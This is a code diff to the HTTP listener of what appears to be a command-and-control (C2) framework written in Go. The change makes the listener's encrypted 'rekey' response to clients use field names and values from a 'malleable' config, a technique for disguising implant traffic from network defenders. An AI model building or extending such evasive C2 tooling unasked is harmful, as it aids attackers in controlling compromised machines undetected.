@@ -2,6 +2,7 @@
 package listeners
 
 import (
+	"c2/internal/common/config"
 	"c2/internal/common/interfaces"
 	"context"
 	"crypto/hmac"
@@ -124,12 +125,33 @@ func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBu
 
 				// Check if it's a rekey command
 				if firstCommand == "rekey" {
-					log.Printf("[GetRequest] Sending XOR encrypted rekey command for clientID: %q", clientID)
+					log.Printf("[GetRequest] Rekey command detected for clientID: %q", clientID)
+
+					// Load malleable config to get custom rekey command value and field names
+					malleableConfig, err := config.GetMalleableConfig()
+					if err != nil {
+						log.Printf("[GetRequest] Warning: Failed to load malleable config, using defaults: %v", err)
+					}
+
+					// Get the malleable rekey command value and field names (use defaults if config fails)
+					rekeyStatusValue := "rekey_required"
+					statusField := "status"
+					dataField := "data"
+					idField := "command_db_id"
+
+					if malleableConfig != nil {
+						rekeyStatusValue = malleableConfig.RekeyCommand
+						statusField = malleableConfig.RekeyStatusField
+						dataField = malleableConfig.RekeyDataField
+						idField = malleableConfig.RekeyIDField
+						log.Printf("[GetRequest] Using malleable rekey - value: %q, fields: {%s, %s, %s}",
+							rekeyStatusValue, statusField, dataField, idField)
+					}
 
 					responseToEncrypt = map[string]interface{}{
-						"status":        "rekey_required",
-						"data":          "",
-						"command_db_id": rekeyCheck[0].CommandDBID,
+						statusField: rekeyStatusValue,
+						dataField:   "",
+						idField:     rekeyCheck[0].CommandDBID,
 					}
 
 					// Delete the command from buffer
